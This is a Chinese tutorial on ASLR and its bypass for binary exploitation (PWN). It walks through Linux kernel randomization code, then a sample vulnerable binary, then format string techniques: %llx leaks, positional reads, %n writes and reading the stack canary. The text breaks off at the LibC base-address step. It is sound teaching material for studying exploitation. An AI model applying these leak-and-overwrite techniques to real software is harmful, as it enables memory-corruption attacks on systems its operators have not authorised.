# PWN入门——大闹ASLR

当ASLR（地址空间布局随机化`Address Space Layout Randomization`）机制关闭时，程序每次运行时的内存布局都是相同的，当该机制处于打开状态时，程序每次运行时的内存布局都会发生变化。



```text
0：完全关闭
1：部分开启（堆、栈、MMAP、动态链接库）
2：完全开启（BRK、堆、栈、MMAP、动态链接库）

echo xxx | sudo tee -a /proc/sys/kernel/randomize_va_space
```



在之前的PWN过程中，ASLR机制都是关闭的，并且在`exploit`一定会设置绝对内存地址，此时完成PWN是在假定知道内存布局的情况下完成的。

下面以栈所在内存空间为例，展示了ASLR开启后的内存布局变化。

```text
第一次运行：
7ffd1b667000-7ffd1b688000 rw-p 00000000 00:00 0                          [stack]

第二次运行：
7ffd7024c000-7ffd7026d000 rw-p 00000000 00:00 0                          [stack]
```

##  



```text
一

ASLR的实现
```



程序加载到内存中的内存布局是由操作系统决定的，通过上面的ASLR开关方式也可以知道，用户空间可以借助内核提供的`proc`虚文件对ASLR进行控制。

## **1.1 虚文件系统**



Linux中秉承着一切皆文件的理念，考虑到文件系统类型的多样性，为了避免用户空间程序操作文件时仍需要考虑不同文件系统带来的差异问题，Linux提供了一个统一的接口供用户空间使用，它就是[VFS](https://zhida.zhihu.com/search?content_id=245727096&content_type=Article&match_order=1&q=VFS&zhida_source=entity)（虚拟文件系统`Virtual File System`）。

VFS为了支持各种文件系统，它定义一套所有文件系统都支持的接口和数据结构，用于支持各类文件系统和VFS协同工作。

```text
struct file_system_type {
    const char *name;
    int fs_flags;
#define FS_REQUIRES_DEV		1 
#define FS_BINARY_MOUNTDATA	2
#define FS_HAS_SUBTYPE		4
#define FS_USERNS_MOUNT		8	/* Can be mounted by userns root */
#define FS_DISALLOW_NOTIFY_PERM	16	/* Disable fanotify permission events */
#define FS_ALLOW_IDMAP         32      /* FS has been updated to handle vfs idmappings. */
#define FS_RENAME_DOES_D_MOVE	32768	/* FS will handle d_move() during rename() internally. */
    int (*init_fs_context)(struct fs_context *);
    const struct fs_parameter_spec *parameters;
    struct dentry *(*mount) (struct file_system_type *, int,
               const char *, void *);
    void (*kill_sb) (struct super_block *);
    struct module *owner;
    struct file_system_type * next;
    struct hlist_head fs_supers;

    struct lock_class_key s_lock_key;
    struct lock_class_key s_umount_key;
    struct lock_class_key s_vfs_rename_key;
    struct lock_class_key s_writers_key[SB_FREEZE_LEVELS];

    struct lock_class_key i_lock_key;
    struct lock_class_key i_mutex_key;
    struct lock_class_key invalidate_lock_key;
    struct lock_class_key i_mutex_dir_key;
};
```



Linux内文件系统需要设置`file_system_type`信息，然后将设置好的信息提交给`register_filesystem`函数进行注册，只有完成注册的文件系统才能被VFS操控。

```text
extern int register_filesystem(struct file_system_type *);
```



`file_system_type`本身定义是非常简单的，主要就是定义获取和删除`super_block`的接口及属性信息，不同文件系统间的`file_system_type`之间通过链接进行管理。

话又说回来，`super_block`是个什么东西呢？

`super_block`是一个更加复杂的结构体，它定义了文件系统的具体信息和对应文件系统的操作接口，是实际管理文件系统的数据结构。

```text
struct super_block {
    struct list_head	s_list;		/* Keep this first */
    dev_t			s_dev;		/* search index; _not_ kdev_t */
    unsigned char		s_blocksize_bits;
    unsigned long		s_blocksize;
    loff_t			s_maxbytes;	/* Max file size */
    struct file_system_type	*s_type;
    const struct super_operations	*s_op;
    const struct dquot_operations	*dq_op;
    const struct quotactl_ops	*s_qcop;
    const struct export_operations *s_export_op;
    unsigned long		s_flags;
    unsigned long		s_iflags;	/* internal SB_I_* flags */
    unsigned long		s_magic;
    struct dentry		*s_root;
    struct rw_semaphore	s_umount;
    int			s_count;
    atomic_t		s_active;
    ......
    spinlock_t		s_inode_wblist_lock;
    struct list_head	s_inodes_wb;	/* writeback inodes */
} __randomize_layout;
```



下面展示了`proc`文件系统是如何进行注册的。

```text
static struct file_system_type proc_fs_type = {
    .name			= "proc",
    .init_fs_context	= proc_init_fs_context,
    .parameters		= proc_fs_parameters,
    .kill_sb		= proc_kill_sb,
    .fs_flags		= FS_USERNS_MOUNT | FS_DISALLOW_NOTIFY_PERM,
};

void __init proc_root_init(void)
{
    ......
    register_filesystem(&proc_fs_type);
}
```



`proc`是进程文件系统，属于Linux中伪文件系统的一种，它没有对应真实的磁盘或硬盘，而是提供给用户空间便利的使用Linux系统资源的接口。常见的伪文件系统有`proc`、`sys`、`dev`等等。通过`proc`可以方便的查看进程信息，比如进程的内存布局、CPU信息等等。

```text
ls /proc/1/
attr       clear_refs       cpuset   fd       limits     mem         net        oom_score      personality  schedstat  smaps_rollup  status   timerslack_ns
autogroup  cmdline          cwd      fdinfo   loginuid   mountinfo   ns         oom_score_adj  projid_map   sessionid  stack         syscall  uid_map
auxv       comm             environ  gid_map  map_files  mounts      numa_maps  pagemap        root         setgroups  stat          task     wchan
cgroup     coredump_filter  exe      io       maps       mountstats  oom_adj    patch_state    sched        smaps      statm         timers
```

##  

## **1.2 proc**



进行Linux驱动开发时，可以借助`proc_ops`结构体、`proc_create`接口、`proc_remove`接口对`proc`进行创建和控制。

`proc_ops`结构体中有两个较为重要的成员，即`proc_read`和`proc_write`，它们分别会响应虚文件被用户空间读写时的操作。下面给出了创建`proc`虚文件的示例代码。

```text
#include <linux/proc_fs.h>

static struct proc_dir_entry* lde_proc_entry = NULL;

static ssize_t lde_proc_read(struct file* file, char __user* ubuf, size_t count, loff_t* data) 
{
    printk(KERN_INFO "%s called file 0x%px, buffer 0x%px count 0x%lx off 0x%llx\n",
        __func__, file, ubuf, count, *data);

    return 0;
}

static ssize_t lde_proc_write(struct file* file, const char __user* ubuf, size_t count, loff_t* data) 
{
    printk(KERN_INFO "%s called legnth 0x%lx, 0x%px\n",
        __func__, count, ubuf);

    return count;
}

static struct proc_ops lde_proc_ops = {
    .proc_read = lde_proc_read,
    .proc_write = lde_proc_write
};

int lde_proc_create(void)
{
    int ret;

    ret = SUCCEED;

    lde_proc_entry = proc_create("lde_proc", 0, NULL, &lde_proc_ops);
    if (!lde_proc_entry) {
        printk(KERN_ERR "%s create proc entry failed\n", __func__);

        ret = PROC_CREATE_FAILED;
    }

    return ret;
}

void lde_proc_remove(void)
{
    if (lde_proc_entry == NULL) {
        printk(KERN_INFO "%s proc not exists\n", __func__);
        goto TAG_RETURN;
    }

    proc_remove(lde_proc_entry);

TAG_RETURN:
    return;
}
```



通过读写虚文件，可以在`dmesg`中看到相关的打印信息。

```text
cat /proc/lde_proc
echo test | sudo tee -a /proc/lde_proc

[  440.396298] starting from 0xffffffffc0af6090 ...
[  446.024481] lde_proc_read called file 0xffff9626c2931400, buffer 0x000077aeb6db8000 count 0x40000 off 0x0
[  459.392387] lde_proc_write called legnth 0x5, 0x00007fff783f3090
[  476.345011] exiting from 0xffffffffc0af60f0 ...
```

##  

## **1.3 randomize_va_space变量的设置**



`proc`除了支持访问进程信息外，它还支持在Linux内核运行时对内核参数进行修改，该机制也被称作`sysctl`。

`/proc/sys/kernel/`中的虚文件会通过`kern_table`进行定义，每个模块都会定义一个处理函数和数据对象，处理函数会负责处理虚文件被读写时进行的操作，而数据对象则是被操作的数值。`randomize_va_space`指定的处理函数是`proc_dointvec`，其作用是读取整数值或写入整数值，待处理的数据对象是`randomize_va_space`，它是一个整型的全局变量。

当向`/proc/sys/kernel/randomize_va_space`写入数值时，`randomize_va_space`变量的数值就会被`proc_dointvec`函数更改。

```text
static struct ctl_table kern_table[] = {
......
#if defined(CONFIG_MMU)
    {
        .procname	= "randomize_va_space",
        .data		= &randomize_va_space,
        .maxlen		= sizeof(int),
        .mode		= 0644,
        .proc_handler	= proc_dointvec,
    },
#endif
......
}
```

##  

## **1.4 内存布局的随机化设置**



当程序启动时，负责加载ELF文件的`load_elf_binary`函数会根据`randomize_va_space`变量设置标志位，当标志位完成设置后，才会正式开始BRK、MMAP、堆、栈、动态链接库、vDSO的地址随机化，随机化的主要操作就是根据随机值对地址进行偏移。

static int load_elf_binary(struct linux_binprm *bprm)

{

......

if (!(current->personality & ADDR_NO_RANDOMIZE) && randomize_va_space)

current->flags |= PF_RANDOMIZE;

```text
setup_new_exec(bprm);

/* Do this so that we can load the interpreter, if need be.  We will
   change some of these later */
retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),
             executable_stack);
......
mm = current->mm;
mm->end_code = end_code;
mm->start_code = start_code;
mm->start_data = start_data;
mm->end_data = end_data;
mm->start_stack = bprm->p;

......

if (!first_pt_load) {
        elf_flags |= MAP_FIXED;
    } else if (elf_ex->e_type == ET_EXEC) {
        elf_flags |= MAP_FIXED_NOREPLACE;
    } else if (elf_ex->e_type == ET_DYN) {
        if (interpreter) {
            load_bias = ELF_ET_DYN_BASE;
            if (current->flags & PF_RANDOMIZE)
                load_bias += arch_mmap_rnd();
            alignment = maximum_alignment(elf_phdata, elf_ex->e_phnum);
            if (alignment)
                load_bias &= ~(alignment - 1);
            elf_flags |= MAP_FIXED_NOREPLACE;
        } else
            load_bias = 0;
......
}

......

if ((current->flags & PF_RANDOMIZE) && (randomize_va_space > 1)) {
    /*
     * For architectures with ELF randomization, when executing
     * a loader directly (i.e. no interpreter listed in ELF
     * headers), move the brk area out of the mmap region
     * (since it grows up, and may collide early with the stack
     * growing down), and into the unused ELF_ET_DYN_BASE region.
     */
    if (IS_ENABLED(CONFIG_ARCH_HAS_ELF_RANDOMIZE) &&
        elf_ex->e_type == ET_DYN && !interpreter) {
        mm->brk = mm->start_brk = ELF_ET_DYN_BASE;
    }

    mm->brk = mm->start_brk = arch_randomize_brk(mm);
```



\#ifdef compat_brk_randomized

current->brk_randomized = 1;

\#endif

}

......

}

### **1.4.1 mmap随机化**



内核会通过`arch_pick_mmap_layout`函数对MMAP进行随机化，当检测到标志位开启时，就会提供随机值给MMAP，否则则会提供0，MMAP会根据该数值对地址空间进行设置。

```text
void setup_new_exec(struct linux_binprm * bprm)
{
    ......
    arch_pick_mmap_layout(me->mm, &bprm->rlim_stack);
    ......
}
EXPORT_SYMBOL(setup_new_exec);

void arch_pick_mmap_layout(struct mm_struct *mm, struct rlimit *rlim_stack)
{
    ......
    arch_pick_mmap_base(&mm->mmap_base, &mm->mmap_legacy_base,
            arch_rnd(mmap64_rnd_bits), task_size_64bit(0),
            rlim_stack);
    ......
}

static unsigned long arch_rnd(unsigned int rndbits)
{
    if (!(current->flags & PF_RANDOMIZE))
        return 0;
    return (get_random_long() & ((1UL << rndbits) - 1)) << PAGE_SHIFT;
}
```

###  

### **1.4.2 栈的随机化**



`load_elf_binary`函数会先通过`setup_arg_pages`函数设置栈空间。栈空间的偏移值由`randomize_stack_top`的结果决定，当标志位中存在`PF_RANDOMIZE`时，`randomize_stack_top`将地址根据随机值进行偏移，否则就不会进行偏移。

```text
unsigned long randomize_stack_top(unsigned long stack_top)
{
    unsigned long random_variable = 0;

    if (current->flags & PF_RANDOMIZE) {
        random_variable = get_random_long();
        random_variable &= STACK_RND_MASK;
        random_variable <<= PAGE_SHIFT;
    }
#ifdef CONFIG_STACK_GROWSUP
    return PAGE_ALIGN(stack_top) + random_variable;
#else
    return PAGE_ALIGN(stack_top) - random_variable;
#endif
}

int setup_arg_pages(struct linux_binprm *bprm,
            unsigned long stack_top,
            int executable_stack)
{
    ......
#ifdef CONFIG_STACK_GROWSUP
    /* Limit stack size */
    stack_base = bprm->rlim_stack.rlim_max;

    stack_base = calc_max_stack_size(stack_base);

    /* Add space for stack randomization. */
    stack_base += (STACK_RND_MASK << PAGE_SHIFT);

    /* Make sure we didn't let the argument array grow too large. */
    if (vma->vm_end - vma->vm_start > stack_base)
        return -ENOMEM;

    stack_base = PAGE_ALIGN(stack_top - stack_base);

    stack_shift = vma->vm_start - stack_base;
    mm->arg_start = bprm->p - stack_shift;
    bprm->p = vma->vm_end - stack_shift;
#else
    stack_top = arch_align_stack(stack_top);
    stack_top = PAGE_ALIGN(stack_top);

    if (unlikely(stack_top < mmap_min_addr) ||
        unlikely(vma->vm_end - vma->vm_start >= stack_top - mmap_min_addr))
        return -ENOMEM;

    stack_shift = vma->vm_end - stack_top;

    bprm->p -= stack_shift;
    mm->arg_start = bprm->p;
#endif
    ......
}
```



一般来讲，栈是向下增长的，如果支持栈向上增长，那么可以通过`CONFIG_STACK_GROWSUP`对内核进行配置。处理栈空间的地址时，如果不使用`CONFIG_STACK_GROWSUP`功能，那么栈顶地址会通过`arch_align_stack`再次进行偏移，然后将低4比特设置为0，进行对齐。

```text
unsigned long arch_align_stack(unsigned long sp)
{
    if (!(current->personality & ADDR_NO_RANDOMIZE) && randomize_va_space)
        sp -= prandom_u32_max(8192);
    return sp & ~0xf;
}
```

###  

### **1.4.3 brk的随机化**



动态申请时，可以通过brk或mmap向系统请求内存资源，当请求的内存小于128kb时会通过brk进行分配，当`randomize_va_space`变量值为2时，`load_elf_binary`函数会额外对brk地址进行偏移，偏移所需的随机值通过`(get_random_long() % range << PAGE_SHIFT)`获取。

```text
unsigned long randomize_page(unsigned long start, unsigned long range)
{
    if (!PAGE_ALIGNED(start)) {
        range -= PAGE_ALIGN(start) - start;
        start = PAGE_ALIGN(start);
    }

    if (start > ULONG_MAX - range)
        range = ULONG_MAX - start;

    range >>= PAGE_SHIFT;

    if (range == 0)
        return start;

    return start + (get_random_long() % range << PAGE_SHIFT);
}

unsigned long arch_randomize_brk(struct mm_struct *mm)
{
    return randomize_page(mm->brk, 0x02000000);
}

load_elf_binary{
    ......
    if ((current->flags & PF_RANDOMIZE) && (randomize_va_space > 1)) {
        /*
         * For architectures with ELF randomization, when executing
         * a loader directly (i.e. no interpreter listed in ELF
         * headers), move the brk area out of the mmap region
         * (since it grows up, and may collide early with the stack
         * growing down), and into the unused ELF_ET_DYN_BASE region.
         */
        if (IS_ENABLED(CONFIG_ARCH_HAS_ELF_RANDOMIZE) &&
            elf_ex->e_type == ET_DYN && !interpreter) {
            mm->brk = mm->start_brk = ELF_ET_DYN_BASE;
        }

        mm->brk = mm->start_brk = arch_randomize_brk(mm);
#ifdef compat_brk_randomized
        current->brk_randomized = 1;
#endif
    }
    ......
}
```

###  

### **1.4.4 动态连接的随机化**



当`load_elf_binary`函数处理动态链接库时，它会根据标志位决定是否给动态链接库的加载地址设置偏移值，偏移值的数值由`arch_rnd`获取。

```text
static unsigned long arch_rnd(unsigned int rndbits)
{
    if (!(current->flags & PF_RANDOMIZE))
        return 0;
    return (get_random_long() & ((1UL << rndbits) - 1)) << PAGE_SHIFT;
}

unsigned long arch_mmap_rnd(void)
{
    return arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);
}

load_elf_binary{
    ......
    if (!first_pt_load) {
        elf_flags |= MAP_FIXED;
    } else if (elf_ex->e_type == ET_EXEC) {
        elf_flags |= MAP_FIXED_NOREPLACE;
    } else if (elf_ex->e_type == ET_DYN) {
        if (interpreter) {
            load_bias = ELF_ET_DYN_BASE;
            if (current->flags & PF_RANDOMIZE)
                load_bias += arch_mmap_rnd();
            alignment = maximum_alignment(elf_phdata, elf_ex->e_phnum);
            if (alignment)
                load_bias &= ~(alignment - 1);
            elf_flags |= MAP_FIXED_NOREPLACE;
        } else
            load_bias = 0;
        ......
    }
    ......
}
```

##  

## **1.5 随机化的总结**



上面已经描述了需要随机化的地址空间（BRK、堆、栈、MMAP、动态链接库、vDSO）是如何及何时进行随机化的，由于随机化的操作是程序运行开始阶段处理的，所以随机化选项的变更并不会影响已经运行的程序。

尽管不同地址空间的随机化方式都是根据随机值进行偏移，但是也可以明显的看到，不同地址空间随机化取值的方式总体上是类似的，先是通过`get_random_long`函数获取随机值，然后根据某数值进行运算，最后根据页偏移进行对齐。

下面对为什么使用不同数值计算的原因进行了解释。

```text
#define PAGE_SHIFT		12

static inline unsigned long get_random_long(void)
{
#if BITS_PER_LONG == 64
    return get_random_u64();
#else
    return get_random_u32();
#endif
}
```



mmap、动态链接库的解释

```text
rndbits = mmap64_rnd_bit = mmap_rnd_bits = CONFIG_ARCH_MMAP_RND_BITS = 32

(get_random_long() & ((1UL << rndbits) - 1)) << PAGE_SHIFT
```



作用：将随机值跟页大小对齐（4kb，0x1000）；1向右移动32位比特，减1后变为32位比特空间内的最大值，特点是所有比特位全为1，当随机值和它进行与运算后，随机值会被保留下来，最后根据页大小向右移动12位，跟页大小对齐。由于运算时比特位自动扩充的原因，((1UL << rndbits) - 1)可以保障数值占用的比特位数量在32内，在64位系统中，用户空间一般会占用48位空间，考虑到高4位会被用于区分不同的ELF文件（比如动态链接库一般是0x7xxx打头，执行文件一般0x5xxx、0x6xxx打头等等），所以系统会对低48位（32位随机值+12位页对齐值）进行设置，并不会触及高4个比特位。

栈的解释：

```text
#define __STACK_RND_MASK(is32bit) ((is32bit) ? 0x7ff : 0x3fffff)
#define STACK_RND_MASK __STACK_RND_MASK(mmap_is_ia32()) 

random_variable = get_random_long();
random_variable &= STACK_RND_MASK;
random_variable <<= PAGE_SHIFT;
```



作用：设置随机值后跟页大小对齐（4kb，0x1000）；原数值和0x3fffff与运算时，只有低22个比特位会被保留下来，当跟页大小对齐后，数值大小会被扩充到34个比特位，在Linux当中，栈地址会以0x7ffx打头，占用14个比特位，所以会对低34个比特位设置。

brk的解释：

```text
range = 0x02000000 // 32mb
range >>= PAGE_SHIFT; // 0x2000 8kb
(get_random_long() % range << PAGE_SHIFT)
```



作用：将随机值和range进行取余运算，保障随机值不会超出range的范围，最后根据页大小进行对齐。

显然，当越多的比特位参与随机化时，也代表着随机值越难被暴力破解。



```text
二

绕过思路
```



下面会以程序中存在泄露地址的情况为前提进行讨论。

即使开启了ASLR，导致程序使用的内存地址在不断的变化，但是变化的只是基地址，程序内容的地址仍然靠基地址加文件内偏移的组合进行定位，因此程序同一元素即使每次每次运行时的地址都不一样，但它减去起始地址的偏移值永远都是固定的。

当我们可以稳定泄露程序内某元素的地址时，就可以先借助起始地址手工计算偏移值，等到下次运行时，就可以直接通过元素的随机地址减偏移值得到随机的起始地址（比如可泄露元素的地址是LibC中，那么就相当于稳定获取LibC的基地址，进而对整个LibC进行利用）。



```text
三

示例讲解
```



下面会对二进制文件的反汇编结果进行解析。

```text
0000000000001179 <leak_func>:
    1179:       55                      push   %rbp
    117a:       48 89 e5                mov    %rsp,%rbp
    117d:       48 83 ec 40             sub    $0x40,%rsp
    设置栈空间
    1181:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    1188:       00 00 
    118a:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    设置金丝雀
    118e:       31 c0                   xor    %eax,%eax
    清空eax
    1190:       48 8d 05 6d 0e 00 00    lea    0xe6d(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    1197:       48 89 c7                mov    %rax,%rdi
    119a:       e8 91 fe ff ff          call   1030 <puts@plt>
    读取待打印字符串并进行打印
    119f:       48 8d 45 c0             lea    -0x40(%rbp),%rax
    11a3:       48 89 c6                mov    %rax,%rsi
    准备2号形参
    11a6:       48 8d 05 5c 0e 00 00    lea    0xe5c(%rip),%rax        # 2009 <_IO_stdin_used+0x9>
    11ad:       48 89 c7                mov    %rax,%rdi
    准备1号形参
    11b0:       b8 00 00 00 00          mov    $0x0,%eax
    eax清零，用于处理返回值为非0的情况
    11b5:       e8 b6 fe ff ff          call   1070 <__isoc99_scanf@plt>
    调用scanf，1号形参为格式化字符串，2号形参为缓冲区变量
    11ba:       48 8d 45 c0             lea    -0x40(%rbp),%rax
    11be:       48 89 c7                mov    %rax,%rdi
    设置缓冲区变量为1号形参
    11c1:       b8 00 00 00 00          mov    $0x0,%eax
    eax清零，用于处理返回值为非0的情况
    11c6:       e8 85 fe ff ff          call   1050 <printf@plt>
    根据1号形参提供的格式化字符串进行打印
    11cb:       90                      nop
    11cc:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    11d0:       64 48 2b 04 25 28 00    sub    %fs:0x28,%rax
    11d7:       00 00 
    11d9:       74 05                   je     11e0 <leak_func+0x67>
    11db:       e8 60 fe ff ff          call   1040 <__stack_chk_fail@plt>
    检测金丝雀
    11e0:       c9                      leave
    11e1:       c3                      ret

00000000000011e2 <read_func>:
    11e2:       55                      push   %rbp
    11e3:       48 89 e5                mov    %rsp,%rbp
    11e6:       48 81 ec 10 01 00 00    sub    $0x110,%rsp
    设置栈空间
    11ed:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
    11f4:       00 00 
    11f6:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    设置金丝雀
    11fa:       31 c0                   xor    %eax,%eax
    清空eax金丝雀
    11fc:       48 8d 05 09 0e 00 00    lea    0xe09(%rip),%rax        # 200c <_IO_stdin_used+0xc>
    1203:       48 89 c7                mov    %rax,%rdi
    1206:       e8 25 fe ff ff          call   1030 <puts@plt>
    准备待打印字符串，并调用puts函数
    120b:       48 8d 85 f0 fe ff ff    lea    -0x110(%rbp),%rax
    1212:       ba 00 10 00 00          mov    $0x1000,%edx
    设置0x1000为3号形参
    1217:       48 89 c6                mov    %rax,%rsi
    将栈上数据设置为2号形参
    121a:       bf 00 00 00 00          mov    $0x0,%edi
    设置0为1号形参
    121f:       e8 3c fe ff ff          call   1060 <read@plt>
    调用read函数，1号形参为文件描述符，2号为缓冲区变量，3号为读取长度
    1224:       90                      nop
    1225:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    1229:       64 48 2b 04 25 28 00    sub    %fs:0x28,%rax
    1230:       00 00 
    1232:       74 05                   je     1239 <read_func+0x57>
    1234:       e8 07 fe ff ff          call   1040 <__stack_chk_fail@plt>
    金丝雀检测
    1239:       c9                      leave
    123a:       c3                      ret

000000000000123b <main>:
    123b:       55                      push   %rbp
    123c:       48 89 e5                mov    %rsp,%rbp
    设置栈空间
    123f:       e8 35 ff ff ff          call   1179 <leak_func>
    1244:       e8 99 ff ff ff          call   11e2 <read_func>
    函数调用
    1249:       48 8d 05 c1 0d 00 00    lea    0xdc1(%rip),%rax        # 2011 <_IO_stdin_used+0x11>
    1250:       48 89 c7                mov    %rax,%rdi
    1253:       e8 d8 fd ff ff          call   1030 <puts@plt>
    准备待打印字符串，并调用puts函数
    1258:       b8 00 00 00 00          mov    $0x0,%eax
    设置返回值
    125d:       5d                      pop    %rbp
    恢复栈底指针
    125e:       c3                      ret
    返回
```



通过上面的分析可以知道，`leak_func`函数会从输入读取内容，然后交给`printf`进行打印，而`read_func`函数则会从输入读取内容给缓冲区变量。`leak_func`函数和`read_func`函数显然给我们提供注入shellcode的机会，但由于现在安卓机制开的比较全，特别是ASLR的存在，使得我们需要先将LibC的基地址泄露出来。

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

cat /proc/sys/kernel/randomize_va_space 
2
```



`leak_func`函数非常宽容的将格式化字符串的定义权交给输入端，对于输入端而言，者是不是利用机会呢？

下面会先对格式化字符串漏洞进行介绍。

## **3.1 格式化字符串漏洞**

###  

### **3.1.1 格式化字符串的介绍**



C语言中函数形参不止可以固定数量，也支持变化的形参数量，可变参数要求函数至少指定一个参数。

C语言最为常见的使用可变参数的函数就是`printf`打印函数，它会接收格式化字符串作为固定参数，然后将格式化字符串与可变参数进行组合，最后将结果输出到标准输出`stdout`中。

```text
int printf(const char* format, ...)
```



`stdin`、`stdout`、`stderr`属于标准输入输出，其中`stdin`的作用是响应键盘的输入，`stdout`、`stderr`将内容输出到屏幕，即它们对于Linux而言是外部设备，在秉承一切皆文件原则的Linux中，它们作为设备文件存在于`dev`目录下。`stdout`和`stderr`的区别在于缓冲区，`stdout`只有当缓冲区满了及遇到换行符的情况下才会输出信息，而`stderr`则是直接输出。

```text
ls /dev/ | grep std
stderr
stdin
stdout
```



对于已经打开的文件，Linux会给它们分配文件描述符，进程可以通过文件描述符对文件进行操作。`stdin`、`stdout`、`stderr`对于的文件描述符分别是0、1、2。

```text
ls /proc/self/fd/
0  1  19  2  20  23  27  3
```



比如某个程序当中含有大量的`printf`函数，而你有时候不需要打印，更不需要将打印输出到屏幕上，那么就可以在函数的开头通过`stdout`的文件描述符1将`stdout`关闭（`close(1)`），那么就不会再看到输出了。

格式化字符串由普通字符和转换字符序列组成，普通字符会按原状进行输出，转换字符序列则会根据转换规则进行转换，然后将转换结果进行输出。在转换字符序列中转换指示符`%`是必备的，它标志着转换字符序列的开始，除此之外C语言还支持在转换指示符后添加扩展指示符，用于进一步指示参数的输出形式。

### **3.1.2 漏洞的利用**



当格式化字符串中存在转换字符序列时，函数就需要根据调用协议从寄存器和栈上取出参数。根据转换字符序列转换，结果的来源可以分成根据参数位置上的数值进行转换和根据参数位置上数值指向的内存区域内的数值进行转换两类。

```text
获取参数的方式：
前6个参数：rdi、rsi、rdx、rcx、r8、r9
第7个及以后的参数：栈
```



根据参数位置上的数值进行转换时，往往问题不会太大，最多是就是转换后

的结果看起来畸形，但是根据参数位置上数值指向的内存区域内的数值进行转换时，问题就很可能出现，比如因为参数位置上数值未必对应正确的内存地址，直接使用会导致错误发生。

### **3.1.2.1 信息的泄露**



当格式化字符串可以被自定定义时，就可以构造转换字符序列，从寄存器和栈中读取数据。比如构造格式化字符串为`"%llx.%llx.`......`%llx.%llx"`时，就可以直接暴露信息，下面给出了示例。

```text
构造的参数："%llx.%llx.......%llx.%llx
读取及输出：scanf("%s", buf);、printf(buf);

通过GDB查看printf函数调用时的寄存器信息：
(gdb) info registers rdi rsi rdx rcx r8 r9
rdi            0x7fffe50928e0      140737035970784
rsi            0xa                 10
rdx            0x0                 0
rcx            0x0                 0
r8             0xffffffff          4294967295
r9             0xffffffffffffff88  -120

前5个泄露信息(rdi被格式化字符串所在地址占用，所以从rsi开始)：
a.0.0.ffffffff.ffffffffffffff88

通过GDBG查看printf函数调用时的栈信息
(gdb) x /20x $rbp
0x7fffc19d3ac0: 0xc19d3ce0      0x00007fff      0x7be111d4      0x000063c7
0x7fffc19d3ad0: 0x786c6c25      0x6c6c252e      0x6c252e78      0x252e786c
0x7fffc19d3ae0: 0x2e786c6c      0x786c6c25      0x6c6c252e      0x6c252e78
0x7fffc19d3af0: 0x252e786c      0x2e786c6c      0x786c6c25      0x6c6c252e
0x7fffc19d3b00: 0x6c252e78      0x252e786c      0x2e786c6c      0x786c6c25
(gdb) x /s $rbp+0x10
0x7fffc19d3ad0: "%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx."...

第6-13个泄露信息：
6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.
```



如果构造`%llx`的数量足够打印完寄存器和构造的格式化字符串，那么`printf`函数还会继续打印金丝雀、返回地址等等，这些数据的泄露，是我们所期望的。当构造大量的`%llx`时，还需要考虑变量的缓冲区是否可以容纳它们，如果缓冲区变量的空间有些小，不足够泄露金丝雀和所需内存地址时，岂不是无法对漏洞进行利用？

在扩展指示符中有一个特殊的存在，即`?$`，当该扩展指示符添加时，就会打印第`?`个参数，那么这个时候就不需要构造大量`%llx`对栈上信息进行泄露了。

目前的信息泄露已经可以指定任意位置了，那么位置上的数据从哪里来呢？

上面已经说明过，前六个是不太好控制的寄存器数据，中间一部分是格式化字符串的数据，后面又是不太好控制的栈数据。幸运的是，在泄露的区域内，存在一段可以很方便控制的区域，如果在这段区域内填充一个地址，然后利用扩展指示符`?$`读取指定位置的地址，就可以实现任意地址的读取。

### **3.1.2.2 信息的篡改**



转换指示符中有一个特殊的存在，它不会指示数据的输出格式，而是会将当前成功写入的字符数量存储到某变量内，它提供了篡改数据的机会，该转换指示符就是`%n`。

```text
printf("%.10u%n\n", 1, &i);
printf("i = %x\n", i);

输出结果：
0000000001 
i = a
```



我们知道，一个内存地址的数字往往是非常大的，为了让数据被篡改为内存地址，就需要输出足够多的字符，好在转换指示符前允许添加数字x，指示输出x个字符，那么这样就不需要构造很多字符了。当然如果不希望单次写入大小过多，也可以对数据进行拆分，然后通过宽度的扩展指示符逐部分进行写入。

```text
hhn：单字节、hn：双字节、n：4字节、ln：8字节、lln：16字节
```

###  

### **3.1.2.3 格式化字符串漏洞的总结**



由于格式化字符串中转换指示符和扩展指示符的特性，使得可以对任意地址进行读取和写入。

![img](https://pic1.zhimg.com/v2-4c44750bfe33017799bea561a840255c_1440w.jpg)

##  

## **3.2 exploit的构建**



从上面可以知道格式化字符串是可以将任意地址上的数据泄露出来的，那么此时`leak_func`函数和`read_func`函数会分别用于泄露LibC地址、金丝雀及注入shellcode。

泄露LibC地址和金丝雀的格式化字符串应该如何构造呢？

### **3.2.1 金丝雀的读取**



这其实是相对明确的，即通过`$x`指定金丝雀和LibC元素所在的位置。金丝雀会给`read_func`函数准备的（注入shellcode，期间需要填充正确的shellcode），但此时金丝雀的读取不是`read_func`函数内部，它们的数值会一样吗？

在前一篇`PWN入门-3-金丝雀风波`中说过，不同线程的金丝雀值会保存在对于的`task_struct`中，因此同线程中所有函数使用的金丝雀值都是一样的，只有所属线程不同时，金丝雀值才会有差异。

上面已经观察过，在`printf`函数中，格式化字符串取第6个后的参数时会从`rbp+0x10`的位置开始读取（`rbp`和`rbp+0x8`间用于存放返回地址和栈底指针）。

我们知道不同函数间的栈空间地址是连续的，`rbp+0x10`已经是`leak_func`函数的栈空间了，该函数内部分配0x40的空间，其中0x8是给金丝雀的，所以金丝雀的偏移值为0x38，中间相当于隔着7个参数，算上寄存器保存的6个参数，它是第13个参数，在格式化字符串中通过`13$llx`就可以将它读取出来。



### **3.2.3 LibC基地址的获取**



